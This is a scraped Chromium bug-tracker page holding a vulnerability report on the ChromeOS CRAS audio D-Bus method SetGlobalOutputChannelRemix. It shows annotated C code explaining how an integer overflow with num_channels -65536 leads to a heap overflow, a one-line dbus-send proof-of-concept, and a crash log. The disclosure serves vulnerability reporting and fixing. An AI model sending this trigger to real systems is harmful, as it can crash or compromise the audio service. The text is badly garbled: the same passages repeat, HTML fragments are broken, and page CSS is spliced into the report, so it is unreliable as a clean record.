      .......................<span class="line"><!---->       .......................<!----></span><br>	if (!dbus_message_get_args(message, &dbus_error, DBUS_TYPE_INT32,<span class="line"><!---->	if (!dbus_message_get_args(message, &amp;dbus_error, DBUS_TYPE_INT32,<!----></span><br>				   &num_channels, DBUS_TYPE_ARRAY,         ---------------------->>>>we get num_channels as integer so we can set it to -65536<span class="line"><!---->				   &amp;num_channels, DBUS_TYPE_ARRAY,         ----------------------&gt;&gt;&gt;&gt;we get num_channels as integer so we can set it to -65536<!----></span><br>				   DBUS_TYPE_DOUBLE, &coeff_array, &count,<span class="line"><!---->				   DBUS_TYPE_DOUBLE, &amp;coeff_array, &amp;count,<!----></span><br>				   DBUS_TYPE_INVALID)) {<span class="line"><!---->				   DBUS_TYPE_INVALID)) {<!----></span><br>		syslog(LOG_WARNING, "Set global output channel remix error: %s",<span class="line"><!---->		syslog(LOG_WARNING, "Set global output channel remix error: %s",<!----></span><br>		       dbus_error.message);<span class="line"><!---->		       dbus_error.message);<!----></span><br>		dbus_error_free(&dbus_error);<span class="line"><!---->		dbus_error_free(&amp;dbus_error);<!----></span><br>		return DBUS_HANDLER_RESULT_NOT_YET_HANDLED;<span class="line"><!---->		return DBUS_HANDLER_RESULT_NOT_YET_HANDLED;<!----></span><br>	}<span class="line"><!---->	}<!----></span><br>	if (num_channels > CRAS_CH_MAX) {         ------------------------>> -65536 can pass it.<span class="line"><!---->	if (num_channels &gt; CRAS_CH_MAX) {         ------------------------&gt;&gt; -65536 can pass it.<!----></span><br>		syslog(LOG_WARNING,<span class="line"><!---->		syslog(LOG_WARNING,<!----></span><br>		       "Set global output channel remix error: num_channels[%d] exceeds %d",<span class="line"><!---->		       "Set global output channel remix error: num_channels[%d] exceeds %d",<!----></span><br>		       num_channels, CRAS_CH_MAX);<span class="line"><!---->		       num_channels, CRAS_CH_MAX);<!----></span><br>		return DBUS_HANDLER_RESULT_NOT_YET_HANDLED;<span class="line"><!---->		return DBUS_HANDLER_RESULT_NOT_YET_HANDLED;<!----></span><br>	}<span class="line"><!---->	}<!----></span><br><br>	if (num_channels * num_channels != count) {          ------------------------------>>> -65536 * -65536 = 0 (int32)    so we can pass the check with the empty array<span class="line"><!---->	if (num_channels * num_channels != count) {          ------------------------------&gt;&gt;&gt; -65536 * -65536 = 0 (int32)    so we can pass the check with the empty array<!----></span><br>		syslog(LOG_WARNING,<span class="line"><!---->		syslog(LOG_WARNING,<!----></span><br>		       "Set global output channel remix error: Invalid argument, coeff_array size[%d] != num_channels[%d]*num_channels[%d]",<span num_channels);<span class="line"><!---->		       count, num_channels, num_channels);<!----></span><br>		return DBUS_HANDLER_RESULT_NOT_YET_HANDLED;<span class="line"><!---->		return DBUS_HANDLER_RESULT_NOT_YET_HANDLED;<!----></span><br>	}<span class="line"><!---->	}<!----></span><br><br>	coefficient = (float *)calloc(count, sizeof(*coefficient));   it will calloc(0)<span class="line"><!---->	coefficient = (float *)calloc(count, sizeof(*coefficient));   it will calloc(0)<!----></span><br>	if (!coefficient)<span class="line"><!---->	if (!coefficient)<!----></span><br>		return DBUS_HANDLER_RESULT_NOT_YET_HANDLED;<span class="line"><!---->		return DBUS_HANDLER_RESULT_NOT_YET_HANDLED;<!----></span><br><br>	for (i = 0; i < count; i++)<span class="line"><!---->	for (i = 0; i &lt; count; i++)<!----></span><br>		coefficient[i] = coeff_array[i];<span class="line"><!---->		coefficient[i] = coeff_array[i];<!----></span><br><br>	audio_thread_config_global_remix(cras_iodev_list_get_audio_thread(),<span class="line"><!---->	audio_thread_config_global_remix(cras_iodev_list_get_audio_thread(),<!----></span><br>					 num_channels, coefficient);         -------------->> here num_channels will be converted to a uint32 value, will cause the heap overflow coeff_array<span class="line"><!---->					 num_channels, coefficient);         --------------&gt;&gt; here num_channels will be converted to a uint32 value, will cause the heap overflow coeff_array<!----></span><br><br>	send_empty_reply(conn, message);<span class="line"><!---->	send_empty_reply(conn, message);<!----></span><br>	free(coefficient);<span class="line"><!---->	free(coefficient);<!----></span><br>	return DBUS_HANDLER_RESULT_HANDLED;<span class="line"><!---->	return         *** Boilerplate reminders! ***<span class="line"><!---->*** Boilerplate reminders! ***<!----></span><br>Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.<span class="line"><!---->Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion.         mr-launch-overview {

            Target project:<label for="targetProjectInput">Target project:</label>
            
              <input id="targetProjectInput" aria-owns="chops-autocomplete-1" aria-autocomplete="both" aria-expanded="false" aria-haspopup="listbox" aria-activedescendant="">
              
      
        /*
         * Really specific class names are necessary because ShadowDOM
         * is disabled for this component.
         */
        .chops-autocomplete-container {
          position: relative;
        }
        .chops-autocomplete-container table {
          padding: 0;
          font-size: var(--chops-main-font-size);
          color: var(--chops-link-color);
          position: absolute;
          background: var(--chops-white);
          border: var(--chops-accessible-border);
          z-index: 999;
          box-shadow: 2px 3px 8px 0px hsla(0, 0%, 0%, 0.3);
          border-spacing: 0;
          border-collapse: collapse;
          /* In the case when the autocomplete extends the
           * height of the viewport, we want to make sure
           * there's spacing. */
          margin-bottom: 1em;
        }
        .chops-autocomplete-container tbody {
          display: block;
          min-width: 100px;
          max-height: 500px;
          overflow: auto;
        }
        .chops-autocomplete-container tr {
          cursor: pointer;
          transition: background 0.2s ease-in-out;
        }
        .chops-autocomplete-container tr[data-selected] {
          background: var(--chops-active-choice-bg);
          text-decoration: underline;
        }
        .chops-autocomplete-container td {
          padding: 0.25em 8px;
          white-space: nowrap;
        }
        .screenreader-hidden {
          clip: rect(1px, 1px, 1px, 1px);
          height: 1px;
          overflow: hidden;
          position: absolute;
          white-space: nowrap;
          width: 1px;
        }

              <mr-autocomplete vocabularyname="project" for="targetProjectInput" role="listbox" id="chops-autocomplete-1"><!---->
      <style>
        /*
         * Really specific class names are necessary because ShadowDOM
         * is disabled for this component.
         */
        .chops-autocomplete-container {
          position: relative;
        }
        .chops-autocomplete-container table {
          padding: 0;
          font-size: var(--chops-main-font-size);
          color: var(--chops-link-color);
          position: absolute;
          background: var(--chops-white);
          border: var(--chops-accessible-border);
          z-index: 999;
          box-shadow: 2px 3px 8px 0px hsla(0, 0%, 0%, 0.3);
          border-spacing: 0;
          border-collapse: collapse;
          /* In the case when the autocomplete extends the
           * height of the viewport, we want to make sure
           * there's spacing. */
          margin-bottom: 1em;
        }
        .chops-autocomplete-container tbody {
          display: block;
          min-width: 100px;
          max-height: 500px;
          overflow: auto;
        }
        .chops-autocomplete-container tr {
          cursor: pointer;
          transition: background 0.2s ease-in-out;
        }
        .chops-autocomplete-container tr[data-selected] {
          background: var(--chops-active-choice-bg);
          text-decoration: underline;
        }
        .chops-autocomplete-container td {
          padding: 0.25em 8px;
          white-space: nowrap;
        }
        .screenreader-hidden {
          clip: rect(1px, 1px, 1px, 1px);
          height: 1px;
          overflow: hidden;
          position: absolute;
          white-space: nowrap;
          width: 1px;
        }
      </style>
      <div class="chops-autocomplete-container">
        <span class="screenreader-hidden" aria-live="polite">
          
        </span>
        <table hidden="">
          <tbody>
            
          </tbody>
        </table>
      </div>
    <!----></mr-autocomplete>
            </div>
          </div>

          <mr-issue-page issueclosed=""><!---->
      <style>
        mr-issue-page {
          --mr-issue-page-horizontal-padding: 12px;
          --mr-toggled-font-family: inherit;
          --monorail-metadata-toggled-bg: var(--monorail-metadata-open-bg);
        }

        }
        mr-issue-page[codeFont] {
          --mr-toggled-font-family: Monospace;
        }
        .container-issue {
          width: 100%;
          flex-direction: column;
          align-items: stretch;
          justify-content: flex-start;
          z-index: 200;
        }
        .container-issue-content {
          padding: 0;
          flex-grow: 1;
          display: flex;
          align-items: stretch;
          justify-content: space-between;
          flex-direction: row;
          flex-wrap: nowrap;
          box-sizing: border-box;
          padding-top: 0.5em;
        }
        .container-outside {
          box-sizing: border-box;
          width: 100%;
          max-width: 100%;
          margin: auto;
          padding: 0;
          display: flex;
          align-items: stretch;
          justify-content: space-between;
          flex-direction: row;
          flex-wrap: no-wrap;
        }
        .container-no-issue {
          padding: 0.5em 16px;
          font-size: var(--chops-large-font-size);
        }
        .metadata-container {
          font-size: var(--chops-main-font-size);
          background: var(--monorail-metadata-toggled-bg);
          border-right: var(--chops-normal-border);
          border-bottom: var(--chops-normal-border);
          width: 24em;
          min-width: 256px;
          flex-grow: 0;
          flex-shrink: 0;
          box-sizing: border-box;
          z-index: 100;
        }
        .issue-header-container {
          z-index: 10;

  :host {
    --mr-edit-field-padding: 0.125em 4px;
    --mr-edit-field-width: 90%;
    --mr-input-grid-gap: 6px;
    font-family: var(--chops-font-family);
    color: var(--chops-primary-font-color);
    font-size: var(--chops-main-font-size);
  }
  /** Converts a <button> to look like an <a> tag. */
  .linkify {
    display: inline;
    padding: 0;
    margin: 0;
    border: 0;
    background: 0;
    cursor: pointer;
  }
  h1, h2, h3, h4 {
    background: none;
  }
  a, chops-button, a.button, .button, .linkify {
    color: var(--chops-link-color);
    text-decoration: none;
    font-weight: var(--chops-link-font-weight);
    font-family: var(--chops-font-family);
  }
  a:hover, .linkify:hover {
    text-decoration: underline;
  }
  a.button, .button {
    /* Links that look like buttons. */
    display: inline-flex;
    align-items: center;
    justify-content: center;
    text-decoration: none;
    transition: filter 0.3s ease-in-out, box-shadow 0.3s ease-in-out;
  }
  a.button:hover, .button:hover {
    filter: brightness(95%);
  }
  chops-button, a.button, .button {
    box-sizing: border-box;
    font-size: var(--chops-main-font-size);
    background: var(--chops-white);

    --chops-button-padding: 0.25em 8px;
    margin: 0;
    margin-left: auto;
  }

    padding: var(--chops-button-padding);
  }

    display: block;
    margin-right: 4px;
  }
  chops-button.emphasized, a.button.emphasized, .button.emphasized {
    background: var(--chops-primary-button-bg);
    color: var(--chops-primary-button-color);
    text-shadow: 1px 1px 3px hsla(0, 0%, 0%, 0.25);
  }
  textarea, select, input {
    box-sizing: border-box;
    font-size: var(--chops-main-font-size);
  }
  /* Note: decoupling heading levels from styles is useful for
  * accessibility because styles will not always line up with semantically
  * appropriate heading levels.
  */
  .medium-heading {
    font-size: var(--chops-large-font-size);
    font-weight: normal;

    align-items: flex-start;
  }

    font-weight: bold;
    text-align: right;
    word-wrap: break-word;

    border: 0;

    text-decoration: underline;

    color: var(--chops-primary-button-color);
    text-shadow: 1px 1px 3px hsla(0, 0%, 0%, 0.25);
  }

    box-sizing: border-box;

  * accessibility because styles will not always line up with semantically
  * appropriate heading levels.

    display: grid;
    max-width: 100%;
    grid-gap: var(--mr-input-grid-gap);
    grid-template-columns: minmax(120px, max-content) 1fr;
    align-items: flex-start;
  }
  .input-grid label {
    font-weight: bold;
    text-align: right;
    word-wrap: break-word;
  }
  @media (max-width: 600px) {
    .input-grid label {
      margin-top: var(--mr-input-grid-gap);
      text-align: left;
    }
    .input-grid {
      grid-gap: var(--mr-input-grid-gap);
      grid-template-columns: 100%;
    }
  }

        mr-app {
          display: block;
          padding-top: var(--monorail-header-height);
          margin-top: -1px; /* Prevent a double border from showing up. */

          /* From shared-styles.js. */
          --mr-edit-field-padding: 0.125em 4px;
          --mr-edit-field-width: 90%;
          --mr-input-grid-gap: 6px;
          font-family: var(--chops-font-family);
          color: var(--chops-primary-font-color);
          font-size: var(--chops-main-font-size);
        }
        main {
          border-top: var(--chops-normal-border);
        }
        .snackbar-container {
          position: fixed;
          bottom: 1em;
          left: 1em;
          display: flex;
          flex-direction: column;
          align-items: flex-start;
          z-index: 1000;
        }
        /** Unfix <chops-snackbar> to allow stacking. */
        chops-snackbar {
          position: static;
          margin-top: 0.5em;
        }
        .project-alert {
          background: var(--chops-orange-50);
          color: var(--chops-field-error-color);
          display: block;
          font-weight: bold;
          text-align: center;
        }
      </style>

    <mr-cue centered="" cueprefname="search_for_numbers" hidden=""></mr-cue>


          
      
        mr-issue-page {
          --mr-issue-page-horizontal-padding: 12px;
          --mr-toggled-font-family: inherit;
          --monorail-metadata-toggled-bg: var(--monorail-metadata-open-bg);
        }
        mr-issue-page[issueClosed] {
          --monorail-metadata-toggled-bg: var(--monorail-metadata-closed-bg);
        }
        mr-issue-page[codeFont] {
          --mr-toggled-font-family: Monospace;
        }
        .container-issue {
          width: 100%;
          flex-direction: column;
          align-items: stretch;
          justify-content: flex-start;
          z-index: 200;
        }
        .container-issue-content {
          padding: 0;
          flex-grow: 1;
          display: flex;
          align-items: stretch;
          justify-content: space-between;
          flex-direction: row;
          flex-wrap: nowrap;
          box-sizing: border-box;
          padding-top: 0.5em;
        }
        .container-outside {
          box-sizing: border-box;
          width: 100%;
          max-width: 100%;
          margin: auto;
          padding: 0;
          display: flex;
          align-items: stretch;
          justify-content: space-between;
          flex-direction: row;
          flex-wrap: no-wrap;
        }
        .container-no-issue {
          padding: 0.5em 16px;
          font-size: var(--chops-large-font-size);
        }
        .metadata-container {
          font-size: var(--chops-main-font-size);
          background: var(--monorail-metadata-toggled-bg);
          border-right: var(--chops-normal-border);
          border-bottom: var(--chops-normal-border);
          width: 24em;
          min-width: 256px;
          flex-grow: 0;
          flex-shrink: 0;
          box-sizing: border-box;
          z-index: 100;
        }
        .issue-header-container {
          z-index: 10;
          position: sticky;
          top: var(--monorail-header-height);
          margin-bottom: 0.25em;
          width: 100%;
        }
        mr-issue-details {
          min-width: 50%;
          max-width: 1000px;
          flex-grow: 1;
          box-sizing: border-box;
          min-height: 100%;
          padding-left: var(--mr-issue-page-horizontal-padding);
          padding-right: var(--mr-issue-page-horizontal-padding);
        }
        mr-issue-metadata {
          position: sticky;
          overflow-y: auto;
          top: var(--monorail-header-height);
          height: calc(100vh - var(--monorail-header-height));
        }
        mr-launch-overview {
          border-left: var(--chops-normal-border);
          padding-left: var(--mr-issue-page-horizontal-padding);
          padding-right: var(--mr-issue-page-horizontal-padding);
          flex-grow: 0;
          flex-shrink: 0;
          width: 50%;
          box-sizing: border-box;
          min-height: 100%;
        }
        @media (max-width: 1126px) {
          .container-issue-content {
            flex-direction: column;
            padding: 0 var(--mr-issue-page-horizontal-padding);
          }
          mr-issue-details, mr-launch-overview {
            width: 100%;
            padding: 0;
            border: 0;
          }
        }
        @media (max-width: 840px) {
          .container-outside {
            flex-direction: column;
          }
          .metadata-container {
            width: 100%;
            height: auto;
            border: 0;
            border-bottom: var(--chops-normal-border);

        Email display settings<h2>Email display settings</h2>

        There is a setting<a href="/hosting/settings">setting</a> to control how
        your email address appears on comments and issues that you post.<p>There is a <a href="/hosting/settings">setting</a> to control how
        your email address appears on comments and issues that you post.</p>

        Project members will always see your full email address.  By
        default, other users who visit the site will see an
        abbreviated version of your email address.<p>Project members will always see your full email address.  By
        default, other users who visit the site will see an
        abbreviated version of your email address.</p>

        If you do not wish your email address to be shared, there
        are other ways to get
        involved<a href="http://www.chromium.org/getting-involved">get
        involved</a> in the community.  To report a problem when using
        the Chrome browser, you may use the "Report an issue..."  item
        on the "Help" menu.<p>If you do not wish your email address to be shared, there
        are other ways to <a href="http://www.chromium.org/getting-involved">get
        involved</a> in the community.  To report a problem when using
        the Chrome browser, you may use the "Report an issue..."  item
        on the "Help" menu.</p>


        
          
      
        <slot></slot>
      <button>
        <slot></slot>
      </button>
    
            Got it
          <chops-button>
            Got it
          </chops-button>
        <div class="edit-actions">
          <chops-button>
            Got it
          </chops-button>
        </div>
      <chops-dialog id="privacyDialog" forced="">
        <h2>Email display settings</h2>

        <p>There is a <a href="/hosting/settings">setting</a> to control how
        your email address appears on comments and issues that you post.</p>

        <p>Project members will always see your full email address.  By
        default, other users who visit the site will see an
        abbreviated version of your email address.</p>

        <p>If you do not wish your email address to be shared, there
        are other ways to <a href="http://www.chromium.org/getting-involved">get
        involved</a> in the community.  To report a problem when using
        the Chrome browser, you may use the "Report an issue..."  item
        on the "Help" menu.</p>


        <div class="edit-actions">
          <chops-button>
            Got it
          </chops-button>
        </div>
      </chops-dialog>

      
      
        
          <slot></slot>
        <div class="dialog-content">
          <slot></slot>
        </div>
      <dialog class="dialog" role="dialog">
        <div class="dialog-content">
          <slot></slot>
        </div>
      </dialog>
    
        This site hosts public issues in public projects<h2>This site hosts public issues in public projects</h2>

        Unlike our internal issue tracker, this site makes most
        issues public, unless the issue is labeled with a Restrict-View-*
        label, such as Restrict-View-Google.<p>Unlike our internal issue tracker, this site makes most
        issues public, unless the issue is labeled with a Restrict-View-*
        label, such as Restrict-View-Google.</p>

        Components are not used for permissions.  And, regardless of
        restriction labels, the issue reporter, owner,
        and Cc'd users may always view the issue.<p>Components are not used for permissions.  And, regardless of
        restriction labels, the issue reporter, owner,
        and Cc'd users may always view the issue.</p>

        

        
          
      
        <slot></slot>
      <button>
        <slot></slot>
      </button>
    
            Got it
          <chops-button>
            Got it
          </chops-button>
        <div class="edit-actions">
          <chops-button>
            Got it
          </chops-button>
        </div>
      <chops-dialog id="corpModeDialog" forced="">
        <h2>This site hosts public issues in public projects</h2>

        <p>Unlike our internal issue tracker, this site makes most
        issues public, unless the issue is labeled with a Restrict-View-*
        label, such as Restrict-View-Google.</p>

        <p>Components are not used for permissions.  And, regardless of
        restriction labels, the issue reporter, owner,
        and Cc'd users may always view the issue.</p>

        

        <div class="edit-actions">
          <chops-button>
            Got it
          </chops-button>

      Steps to reproduce the problem:<b class="line"><!---->Steps to reproduce the problem:<!----></b><br>1.The cras D-Bus service has a method called SetGlobalOutputChannelRemix. The num_channels can be arbitrarily integer sent as a by an attacker. The handler for this method lives in cras_dbus_control.c, which will cause heap  overflow in cras<span class="line"><!---->1.The cras D-Bus service has a method called SetGlobalOutputChannelRemix. The num_channels can be arbitrarily integer sent as a by an attacker. The handler for this method lives in cras_dbus_control.c, which will cause heap  overflow in cras<!----></span><br>2.I test it in chromeos vm<span class="line"><!---->2.I test it in chromeos vm<!----></span><br>```<span class="line"><!---->```<!----></span><br>dbus-send --system --dest=org.chromium.cras --type=method_call --print-reply /org/chromium/cras org.chromium.cras.Control.SetGlobalOutputChannelRemix int32:-65536 array:double:<span class="line"><!---->dbus-send --system --dest=org.chromium.cras --type=method_call --print-reply /org/chromium/cras org.chromium.cras.Control.SetGlobalOutputChannelRemix int32:-65536 array:double:<!----></span><br>``<span class="line"><!---->``<!----></span><br>3.the /var/log/messages will show that <span class="line"><!---->3.the /var/log/messages will show that <!----></span><br>```<span class="line"><!---->```<!----></span><br>2023-03-01T17:20:02.251696Z INFO kernel: [ 4422.241569] cras[13922]: segfault at 0 ip 00005a922c51c0f2 sp 00007ffedb877590 error 4 in cras[5a922c506000+b7000]<span class="line"><!---->2023-03-01T17:20:02.251696Z INFO kernel: [ 4422.241569] cras[13922]: segfault at 0 ip 00005a922c51c0f2 sp 00007ffedb877590 error 4 in cras[5a922c506000+b7000]<!----></span><br>2023-03-01T17:20:02.251763Z INFO kernel: [ 4422.241569] Code: 45 89 e1 41 83 e1 03 41 ba 08 00 00 00 45 31 db 45 31 ed eb 15 0f 1f 00 49 ff c5 41 01 da 4d 01 e3 4d 39 e5 0f 84 76 01 00 00 <4e> 8b 04 e8 83 fb 0c 0f 83 a1 00 00 00 31 ff 49 89 fe 49 f7 d6 4d<span class="line"><!---->2023-03-01T17:20:02.251763Z INFO kernel: [ 4422.241569] Code: 45 89 e1 41 83 e1 03 41 ba 08 00 00 00 45 31 db 45 31 ed eb 15 0f 1f 00 49 ff c5 41 01 da 4d 01 e3 4d 39 e5 0f 84 76 01 00 00 &lt;4e&gt; 8b 04 e8 83 fb 0c 0f 83 a1 00 00 00 31 ff 49 89 fe 49 f7 d6 4d<!----></span><br><br><br>bitset:<span class="line"><!---->bitset:<!----></span><br>[1] <span class="line"><!---->[1] <!----></span>https://chromium-review.googlesource.com/c/chromiumos/third_party/adhd/+/4111723<a class="undefined" target="_blank" href="https://chromium-review.googlesource.com/c/chromiumos/third_party/adhd/+/4111723"><!---->https://chromium-review.googlesource.com/c/chromiumos/third_party/adhd/+/4111723<!----></a><br><br>Problem Description:<b class="line"><!---->Problem Description:<!----></b><br>above all<span class="line"><!---->above all<!----></span><br><br>Additional Comments:<b class="line"><!---->Additional Comments:<!----></b><br><br><br>Chrome version: <b class="line"><!---->Chrome version: <!----></b>110.0.0.0 <span class="line"><!---->110.0.0.0 <!----></span>Channel: <b class="line"><!---->Channel: <!----></b>Not sure<span class="line"><!---->Not sure<!----></span><br><br>OS:<b class="line"><!---->OS:<!----></b>Chrome OS<span class="line"><!---->Chrome OS<!----></span><mr-comment-content></mr-comment-content>

        though the commit (<span class="line"><!---->though the commit (<!----></span>https://chromium-review.googlesource.com/c/chromiumos/third_party/adhd/+/4111723<a class="undefined" target="_blank" overflow<!----></span><br><br>in the function handle_set_global_output_channel_remix(<span class="line"><!---->in the function class="undefined" target="_blank" DBusHandlerResult<!----></span><br>handle_set_global_output_channel_remix(DBusConnection *conn,<span class="line"><!---->handle_set_global_output_channel_remix(DBusConnection       .......................<span class="line"><!---->       .......................<!----></span><br>	if (!dbus_message_get_args(message, &dbus_error, DBUS_TYPE_INT32,<span class="line"><!---->	if (!dbus_message_get_args(message, &amp;dbus_error, DBUS_TYPE_INT32,<!----></span><br>				   &num_channels, DBUS_TYPE_ARRAY,         ---------------------->>>>we get num_channels as integer so we can set it to -65536<span class="line"><!---->				   &amp;num_channels, DBUS_TYPE_ARRAY,         ----------------------&gt;&gt;&gt;&gt;we get num_channels as integer so we can set it to -65536<!----></span><br>				   DBUS_TYPE_DOUBLE, &coeff_array, &count,<span class="line"><!---->				   DBUS_TYPE_DOUBLE, &amp;coeff_array, &amp;count,<!----></span><br>				   DBUS_TYPE_INVALID)) {<span class="line"><!---->				   DBUS_TYPE_INVALID)) {<!----></span><br>		syslog(LOG_WARNING, "Set global output channel remix error: %s",<span class="line"><!---->		syslog(LOG_WARNING, "Set global output channel remix error: %s",<!----></span><br>		       dbus_error.message);<span class="line"><!---->		       dbus_error.message);<!----></span><br>		dbus_error_free(&dbus_error);<span class="line"><!---->		dbus_error_free(&amp;dbus_error);<!----></span><br>		return DBUS_HANDLER_RESULT_NOT_YET_HANDLED;<span class="line"><!---->		return DBUS_HANDLER_RESULT_NOT_YET_HANDLED;<!----></span><br>	}<span class="line"><!---->	}<!----></span><br>	if (num_channels > CRAS_CH_MAX) {         ------------------------>> -65536 can pass it.<span class="line"><!---->	if (num_channels &gt; CRAS_CH_MAX) {         ------------------------&gt;&gt; -65536 can pass it.<!----></span><br>		syslog(LOG_WARNING,<span class="line"><!---->		syslog(LOG_WARNING,<!----></span><br>		       "Set global output channel remix error: num_channels[%d] exceeds %d",<span class="line"><!---->		       "Set global output channel remix error: num_channels[%d] exceeds %d",<!----></span><br>		       num_channels, CRAS_CH_MAX);<span class="line"><!---->		       num_channels, CRAS_CH_MAX);<!----></span><br>		return DBUS_HANDLER_RESULT_NOT_YET_HANDLED;<span class="line"><!---->		return DBUS_HANDLER_RESULT_NOT_YET_HANDLED;<!----></span><br>	}<span class="line"><!---->	}<!----></span><br><br>	if (num_channels * num_channels != count) {          ------------------------------>>> -65536 * -65536 = 0 (int32)    so we can pass the check with the empty array<span class="line"><!---->	if (num_channels * num_channels != count) {          ------------------------------&gt;&gt;&gt; -65536 * -65536 = 0 (int32)    so we can pass the check with the empty array<!----></span><br>		syslog(LOG_WARNING,<span class="line"><!---->		syslog(LOG_WARNING,<!----></span><br>		       "Set global output channel remix error: Invalid argument, coeff_array size[%d] != num_channels[%d]*num_channels[%d]",<span num_channels);<span class="line"><!---->		       count, num_channels, num_channels);<!----></span><br>		return DBUS_HANDLER_RESULT_NOT_YET_HANDLED;<span class="line"><!---->		return DBUS_HANDLER_RESULT_NOT_YET_HANDLED;<!----></span><br>	}<span class="line"><!---->	}<!----></span><br><br>	coefficient = (float *)calloc(count, sizeof(*coefficient));   it will calloc(0)<span class="line"><!---->	coefficient = (float *)calloc(count, sizeof(*coefficient));   it will calloc(0)<!----></span><br>	if (!coefficient)<span class="line"><!---->	if (!coefficient)<!----></span><br>		return DBUS_HANDLER_RESULT_NOT_YET_HANDLED;<span class="line"><!---->		return DBUS_HANDLER_RESULT_NOT_YET_HANDLED;<!----></span><br><br>	for (i = 0; i < count; i++)<span class="line"><!---->	for (i = 0; i &lt; count; i++)<!----></span><br>		coefficient[i] = coeff_array[i];<span class="line"><!---->		coefficient[i] = coeff_array[i];<!----></span><br><br>	audio_thread_config_global_remix(cras_iodev_list_get_audio_thread(),<span class="line"><!---->	audio_thread_config_global_remix(cras_iodev_list_get_audio_thread(),<!----></span><br>					 num_channels, coefficient);         -------------->> here num_channels will be converted to a uint32 value, will cause the heap overflow coeff_array<span class="line"><!---->					 num_channels, coefficient);         --------------&gt;&gt; here num_channels will be converted to a uint32 value, will cause the heap overflow coeff_array<!----></span><br><br>	send_empty_reply(conn, message);<span class="line"><!---->	send_empty_reply(conn, message);<!----></span><br>	free(coefficient);<span class="line"><!---->	free(coefficient);<!----></span><br>	return DBUS_HANDLER_RESULT_HANDLED;<span class="line"><!---->	return         *** Boilerplate reminders! ***<span class="line"><!---->*** Boilerplate reminders! ***<!----></span><br>Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.<span class="line"><!---->Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion.         mr-launch-overview {

            Target project:<label for="targetProjectInput">Target project:</label>
            
              <input id="targetProjectInput" aria-owns="chops-autocomplete-1" aria-autocomplete="both" aria-expanded="false" aria-haspopup="listbox" aria-activedescendant="">
              
      
        /*
         * Really specific class names are necessary because ShadowDOM
         * is disabled for this component.
         */
        .chops-autocomplete-container {
          position: relative;
        }
        .chops-autocomplete-container table {
          padding: 0;
          font-size: var(--chops-main-font-size);
          color: var(--chops-link-color);
          position: absolute;
          background: var(--chops-white);
          border: var(--chops-accessible-border);
          z-index: 999;
          box-shadow: 2px 3px 8px 0px hsla(0, 0%, 0%, 0.3);
          border-spacing: 0;
          border-collapse: collapse;
          /* In the case when the autocomplete extends the
           * height of the viewport, we want to make sure
           * there's spacing. */
          margin-bottom: 1em;
        }
        .chops-autocomplete-container tbody {
          display: block;
          min-width: 100px;
          max-height: 500px;
          overflow: auto;
        }
        .chops-autocomplete-container tr {
          cursor: pointer;
          transition: background 0.2s ease-in-out;
        }
        .chops-autocomplete-container tr[data-selected] {
          background: var(--chops-active-choice-bg);
          text-decoration: underline;
        }
        .chops-autocomplete-container td {
          padding: 0.25em 8px;
          white-space: nowrap;
        }
        .screenreader-hidden {
          clip: rect(1px, 1px, 1px, 1px);
          height: 1px;
          overflow: hidden;
          position: absolute;
          white-space: nowrap;
          width: 1px;
        }

              <mr-autocomplete vocabularyname="project" for="targetProjectInput" role="listbox" id="chops-autocomplete-1"><!---->
      <style>
        /*
         * Really specific class names are necessary because ShadowDOM
         * is disabled for this component.
         */
        .chops-autocomplete-container {
          position: relative;
        }
        .chops-autocomplete-container table {
          padding: 0;
          font-size: var(--chops-main-font-size);
          color: var(--chops-link-color);
          position: absolute;
          background: var(--chops-white);
          border: var(--chops-accessible-border);
          z-index: 999;
          box-shadow: 2px 3px 8px 0px hsla(0, 0%, 0%, 0.3);
          border-spacing: 0;
          border-collapse: collapse;
          /* In the case when the autocomplete extends the
           * height of the viewport, we want to make sure
           * there's spacing. */
          margin-bottom: 1em;
        }
        .chops-autocomplete-container tbody {
          display: block;
          min-width: 100px;
          max-height: 500px;
          overflow: auto;
        }
        .chops-autocomplete-container tr {
          cursor: pointer;
          transition: background 0.2s ease-in-out;
        }
        .chops-autocomplete-container tr[data-selected] {
          background: var(--chops-active-choice-bg);
          text-decoration: underline;
        }
        .chops-autocomplete-container td {
          padding: 0.25em 8px;
          white-space: nowrap;
        }
        .screenreader-hidden {
          clip: rect(1px, 1px, 1px, 1px);
          height: 1px;
          overflow: hidden;
          position: absolute;
          white-space: nowrap;
          width: 1px;
        }
      </style>
      <div class="chops-autocomplete-container">
        <span class="screenreader-hidden" aria-live="polite">
          
        </span>
        <table hidden="">
          <tbody>
            
          </tbody>
        </table>
      </div>
    <!----></mr-autocomplete>
            </div>
          </div>

          <mr-issue-page issueclosed=""><!---->
      <style>
        mr-issue-page {
          --mr-issue-page-horizontal-padding: 12px;
          --mr-toggled-font-family: inherit;
          --monorail-metadata-toggled-bg: var(--monorail-metadata-open-bg);
        }

        }
        mr-issue-page[codeFont] {
          --mr-toggled-font-family: Monospace;
        }
        .container-issue {
          width: 100%;
          flex-direction: column;
          align-items: stretch;
          justify-content: flex-start;
          z-index: 200;
        }
        .container-issue-content {
          padding: 0;
          flex-grow: 1;
          display: flex;
          align-items: stretch;
          justify-content: space-between;
          flex-direction: row;
          flex-wrap: nowrap;
          box-sizing: border-box;
          padding-top: 0.5em;
        }
        .container-outside {
          box-sizing: border-box;
          width: 100%;
